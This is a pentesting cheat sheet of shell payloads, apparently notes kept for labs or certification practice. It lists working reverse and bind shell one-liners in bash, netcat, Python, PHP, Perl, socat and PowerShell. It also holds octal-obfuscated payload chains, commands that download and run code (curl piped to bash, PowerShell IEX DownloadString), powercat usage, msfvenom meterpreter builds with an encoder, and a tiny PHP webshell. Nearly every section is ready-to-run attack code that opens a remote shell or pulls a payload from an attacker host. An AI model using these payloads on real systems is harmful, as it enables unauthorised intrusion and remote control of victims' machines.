# Shells

{% hint style="info" %}
There are many types of webshells and Kali includes several in /usr/share/webshells
{% endhint %}

{% code overflow="wrap" fullWidth="true" %}
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
https://www.revshells.com/
https://github.com/t3l3machus/hoaxshell
https://github.com/ShutdownRepo/shellerator
https://github.com/Fahrj/reverse-ssh
https://github.com/SanjinDedic/pwnThings/tree/main
```
{% endcode %}

## Linux

{% code overflow="wrap" fullWidth="true" %}
```bash
# NETCAT, NOHUP
nc -e /bin/sh 10.0.0.1 4444
nohup nc -e /bin/bash 10.10.14.14 443 &
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
# SIMPLE BASH REVSHELLS 
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
# BASH REVSHELL IN 2 STEPS:
# 1 - Create revshell.html with a bash revshell inside
#!/bin/bash
bash -i >& /dev/tcp/10.10.0.0/443 0>&1
# 2 - We host this archive and download it to the target to be interpreted as bash
curl http://10.10.4.20/revshell.html | bash 
######  BASH REVSHELL TRANSFER. PERMIT. EXECUTE. UPLOAD AND EXECUTE
# Transfer a file to the target, give executable permisions and run it to get a revshell.
# Host reverse shell with Python, upload it to the target and execute it
curl $IP/$FILE | bash
(1) curl 192.168.0.0/revshell.sh -o /dev/shm
(2) chmod +x /dev/shm/revshell.sh
(3) bash /dev/shm/revshell.sh
# We can follow the same steps above with wget
wget $IP/$FILE -O $PATH

# IMPORTANT: REMOVE REDIRECTIONS FOR SOME ODD SHELLS LIKE CSH


attacker=192.168.62.187
port=443
echo -n "echo\40\42bash\40%.s\55i\76\46/dev/tcp/${attacker}/${port}\40%.s0\76\46%.s1\42\174bash\73\12"
echo -n "netcat\40%.s${attacker}\40%.s${port}\40\55e\40\57bin\57sh\73\12"
echo -n """python\40\55c\40\47import\40socket\54subprocess\54os\73s\75socket.socket\50socket.AF\137INET\54socket.SOCK_STREAM\51\73s.connect\50\50\42%.s${attacker}\42\54%.s${port}\51\51\73os.dup2\50s.fileno\50\51\54%.s0\51\73\40os.dup2\50s.fileno\50\51\54%.s1\51\73\40os.dup2\50s.fileno\50\51\54%.s2\51\73p\75subprocess.call\50\133\42\57bin\57sh\42\54\\4255i\42\135\51\73\47\73\12"""
echo -n """php\40\55r\40\47\44sock\75fsockopen\50\42%.s${attacker}\42\54%.s${port}\51\73exec\50\42\57bin\57sh\40\55i\40\74\46%.s3\40\76\46%.s3\40%.s2\76\46%.s3\42\51\73\47\12"""
echo -n """perl\40\55e\40\47use\40Socket\73\44i\75\42%.s${attacker}\42\73\44p\75%.s${port}\73socket\50S\54PF_INET\54SOCK_STREAM\54getprotobyname\50tcp\51\51\73if\50connect\50S\54sockaddr\137in\50\44p\54inet_aton\50\44i\51\51\51\51\173open\50STDIN\54\42\76\46S\42\51\73open\50STDOUT\54\42\76\46S\42\51\73open\50STDERR\54\42\76\46S\42\51\73exec\50\42\57bin\57sh\40\55i\42\51\73\175\73\47\12"""
echo -n "echo\40\42\50function\50\51\173var\40net\75require\50\47net\47\51\54cp\75require\50\47child_process\47\51\54sh\75cp.spawn\50\47sh\47\54\40\133\135\51\73var\40client\75new net.Socket\50\51\73client.connect\50%.s${port}\54\47%.s${attacker}\47%.s\54function\50\51\173client.pipe\50sh.stdin\51\73sh.stdout.pipe\50client\51\73sh.stderr.pipe\50client\51\73\175\51\73return\40\57a\57\73\40\57\57\40Prevents\12\175\51\50\51\73\42\76\57tmp\57shell\137node.js\73node\40\57tmp\57shell\137node.js"

127.0.0.1|printf 'echo\40\42bash\40%.s\55i\76\46/dev/tcp/192.168.62.187/443\40%.s0\76\46%.s1\42\174bash\73\12netcat\40%.s192.168.62.187\40%.s443\40\55e\40\57bin\57sh\73\12python\40\55c\40\47import\40socket\54subprocess\54os\73s\75socket.socket\50socket.AF\137INET\54socket.SOCK_STREAM\51\73s.connect\50\50\42%.s192.168.62.187\42\54%.s443\51\51\73os.dup2\50s.fileno\50\51\54%.s0\51\73\40os.dup2\50s.fileno\50\51\54%.s1\51\73\40os.dup2\50s.fileno\50\51\54%.s2\51\73p\75subprocess.call\50\133\42\57bin\57sh\42\54\4255i\42\135\51\73\47\73\12php\40\55r\40\47\44sock\75fsockopen\50\42%.s192.168.62.187\42\54%.s443\51\73exec\50\42\57bin\57sh\40\55i\40\74\46%.s3\40\76\46%.s3\40%.s2\76\46%.s3\42\51\73\47\12perl\40\55e\40\47use\40Socket\73\44i\75\42%.s192.168.62.187\42\73\44p\75%.s443\73socket\50S\54PF_INET\54SOCK_STREAM\54getprotobyname\50tcp\51\51\73if\50connect\50S\54sockaddr\137in\50\44p\54inet_aton\50\44i\51\51\51\51\173open\50STDIN\54\42\76\46S\42\51\73open\50STDOUT\54\42\76\46S\42\51\73open\50STDERR\54\42\76\46S\42\51\73exec\50\42\57bin\57sh\40\55i\42\51\73\175\73\47\12echo\40\42\50function\50\51\173var\40net\75require\50\47net\47\51\54cp\75require\50\47child_process\47\51\54sh\75cp.spawn\50\47sh\47\54\40\133\135\51\73var\40client\75new net.Socket\50\51\73client.connect\50%.s443\54\47%.s192.168.62.187\47%.s\54function\50\51\173client.pipe\50sh.stdin\51\73sh.stdout.pipe\50client\51\73sh.stderr.pipe\50client\51\73\175\51\73return\40\57a\57\73\40\57\57\40Prevents\12\175\51\50\51\73\42\76\57tmp\57shell\137node.js\73node\40\57tmp\57shell\137node.js'|sh


# IN CASE NO SPACES ALLOWED
echo -ne '$revshell' | base64
echo${IFS}base64Revshell${IFS}|base64${IFS}-d|bash
# PHP, PYTHON
php -r '$sock=fsockopen("10.0.2.5",443);exec("/bin/sh -i <&3 >&3 2>&3");'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
# BIND SHELL
nc -lvp 4444 -e /bin/sh # (TARGET)
nc 10.11.1.0 4444 # (attacker)
# SOCAT
user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4444
socat TCP:10.10.10.10:9001 EXEC:sh
user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```
{% endcode %}

### Upgrade to Interactive TTY shell

{% code overflow="wrap" fullWidth="true" %}
```bash
tty # command to know if we are on a tty shell
script -q /dev/null -c /bin/bash
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
reset
stty rows X cols X
export SHELL=/bin/bash
# If keeps simple bash-4.2$ and it does not show username and current dir on it
bash-4.2$ export HOME=/etc/skel
bash-4.2$ bash

# ANOTHER WAY TO DO IT
script -c "/bin/bash -i" /dev/null # good option if our host has zsh shell
bash -i
script -q /dev/null -c bash

# USING PYTHON OR PYTHON3
python -c 'import pty;pty.spawn("bin/bash")'
export TERM=xterm
export TERM=screen-256color # to run commands like clear
ctrl+z 
# NOW CHECK echo $TERM and stty -a for the next steps
stty raw -echo; fg # has to be done in one line if we use zsh
# [INTRO] 
reset
# [INTRO]
stty rows 38 columns 116 # check values with stty -a on Kali
```
{% endcode %}

### Escape / Restricted shell

{% code overflow="wrap" fullWidth="true" %}
```bash
https://pentestbook.six2dez.com/post-exploitation/linux#escaping-restricted-shell
https://7h3w4lk3rs-organization.gitbook.io/the-hive/network-attacks-1/shells-and-payloads/interactive-shell

# EXECUTING COMMAND WITH SSH (THESE ARE EXECUTED AT THE VERY BEGINNING)
ssh user@domain $COMMAND
ssh user@machine.htb bash
ssh user@IP -t "bash â€“-noprofile"
# FIX PATH
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:$PATH
# GOOD ARTICLE
https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
# Check GTFOBins if any of the allowed binaries can spawn a shell
https://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf
```
{% endcode %}

## Windows

| [https://github.com/Dhayalanb/windows-php-reverse-shell](https://github.com/Dhayalanb/windows-php-reverse-shell) |
| ---------------------------------------------------------------------------------------------------------------- |

```bash
#-----------------------------------NETCAT-------------------------
# TO EXECUTE A REVERSE SHELL WITHOUT COPYING NC.EXE IN ONE SINGLE STEP
start /b #---> starts a program in the background (optional, try with or without)
(start /b) \\$IP\$SHARE\nc.exe $IP $PORT -e cmd.exe
cmd /c \\$IP\$SHARE\nc.exe $IP $PORT -e cmd 

rlwrap -rci nc -lvnp 4444
# -c --> complete filenames
# -i --> ignore case sensitive (except for filenames) 
# -r --> remember, put all words seen on in- and output on the completion list

# Upload nc.exe to the victim machine on \Windows\Temp or \Windows\Tasks and there:
nc $IP $PORT -e $COMMAND
nc 10.10.14.20 443 -e powershell
```

### Base64

[https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58](https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58)

### Powershell

<pre class="language-powershell" data-overflow="wrap" data-full-width="true"><code class="lang-powershell">https://github.com/X0RW3LL/PSX
https://gist.github.com/jakobfriedl/7e1aca7228671271f1a4f86c9fd7a53e

# One-liner
https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3

# Base64
echo -n "IEX(New-Object Net.WebClient).downloadString('http://$IP/Inv-Pow.ps1')" | iconv --to-code UTF-16LE | base64 -w 0
powershell -EncodedCommand ...

Start-Process -NoNewWindow -FilePath C:\Windows\Tasks\shell.exe
# New and independent PS instance/shell
Start-Process powershell.exe -ArgumentList "-NoProfile -NoExit -Command {Start-Process powershell.exe -ArgumentList '-NoProfile -NoExit -Command {Invoke-Expression "Your-Command-Here"}'}"

# UPGRADE TO POWERSHELL REVERSE SHELL
git clone https://github.com/samratashok/nishang.git
# Go to Shells/Invoke-PowerShellTcp.ps1 and add a command to the end:
Invoke-PowerShellTcp -Reverse -IPAddress $ATTACKER_IP -Port 443
# Then share Invoke-PowerShellTcp.ps1 with Python server (rename file to make it easier) and execute the command below on the normal cmd shell:
C:\Users\Desktop>start /b powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9/Inv-Pow.ps1')
# EVEN BETTER, USE THE ONE WITH SYSNATIVE FROM A WEBSHELL TO MIGRATE TO THE PROPER WINDOWS PROCESS
# First, check the architecture of the victim machine:
PS > [Environment]::Is64BitOperatingSystem
PS > [Environment]::Is64BitProcess
# If the answers don't match (x64 and not 64-bits process) we have to migrate.
start /b C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.20/Inv-Pow.ps1')
# The complete path to powershell.exe gets us the correct process.

# POWERSHELL ENCODE
kali> pwsh
PS > $Text = '$client = New-Object ...$REST_OF_REVSHELL_ONE_LINER'
PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
PS > $EncodedText =[Convert]::ToBase64String($Bytes)
PS> $EncodedText
Then to execute powershell -enc $BASE64
pwsh -f base64.ps1
# Base64 encoded command
powershell -nop -w hidden -e FZc9jpB2base64command...
<strong>
</strong><strong># One-liner revshell
</strong>powershell -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.0.0',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&#x26;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
#One-liner bind shell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&#x26;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&#x26;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
# ANOTHER ONE (URL ENCODE IT IF USING IT IN A WEBSHELL)
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('&#x3C;ip>',&#x3C;port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&#x26;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
# ANOTHER ONE
powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
</code></pre>

### C++

[https://github.com/tudorthe1ntruder/reverse-shell-poc](https://github.com/tudorthe1ntruder/reverse-shell-poc)

### Powercat (like Netcat but in PS)

<pre class="language-powershell" data-overflow="wrap" data-full-width="true"><code class="lang-powershell">https://www.hackingarticles.in/powercat-a-powershell-netcat/
# Powershell script, more efficient than revshell as we can download and execute it on memory without touching the disk as well
IEX (New-Object System.Net.Webclient).DownloadString("http://$IP/powercat.ps1");powercat -c $IP -p 4444 -e powershell

https://github.com/besimorhino/powercat/blob/master/powercat.ps1
PS> powercat -h
sudo nc -lnvp 443 > receiving_powercat.ps1 # to receive a file
PS> powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1 # to send a file
apt install powercat ---> /usr/share/windows-resources/powercat
# DOT SOURCING
. .\powercat.ps1
# REVERSE SHELL
powercat -c $IP -p 443 -e cmd.exe
# BIND SHELL
powercat -l -p 443 -e cmd.exe # (VICTIM)
nc 10.11.0.22 443 # attacker
# Stand-alone payload (first start listener on Kali)
PS> powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
PS> ./reverseshell.ps1
# ENCODE COMMAND
PS> powercat -c $IP -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
<strong># TO EXECUTE IT
</strong>PS> powershell.exe -E $ENCODED_PAYLOAD # (ALL THE PAYLOAD, EVEN IF IT'S HUGE)
</code></pre>

### ConPtyshell (fully interactive);

[https://github.com/antonioCoco/ConPtyShell](https://github.com/antonioCoco/ConPtyShell)

## Webshells

Kali Linux includes several PHP webshells in the /usr/share/webshells/

## PHP

### Universal PHP shell

[https://github.com/WhiteWinterWolf/wwwolf-php-webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)

### Shortest PHP webshell

[https://github.com/Xib3rR4dAr/shortest-php-webshell](https://github.com/Xib3rR4dAr/shortest-php-webshell)

```php
<?=`ls`;
```

## Encrypted revshell (SSH)

[https://github.com/NHAS/reverse\_ssh](https://github.com/NHAS/reverse_ssh)

## pwncat

[https://github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat)

## Bind shells

{% code overflow="wrap" %}
```bash
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md

nc -nlvp 51337 -e /bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 51337 >/tmp/f
```
{% endcode %}

## HTTP Reverse Shell

{% embed url="https://github.com/apurvsinghgautam/HTTP-Reverse-Shell" %}

## Ruby

{% embed url="https://github.com/secjohn/ruby-shells" %}

## Meterpreter

{% code overflow="wrap" fullWidth="true" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
# TO START THE SHELL
Start-Process "shell-name.exe"
.\file.exe
# LINUX STAGELESS PAYLOAD
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```
{% endcode %}

## Extra

[https://thehackerway.com/2022/11/16/como-crear-una-reverse-shell-cifrada-parte-2-de-2/\
https://github.com/t3l3machus/Villain](https://thehackerway.com/2022/11/16/como-crear-una-reverse-shell-cifrada-parte-2-de-2/https://github.com/t3l3machus/Villain)
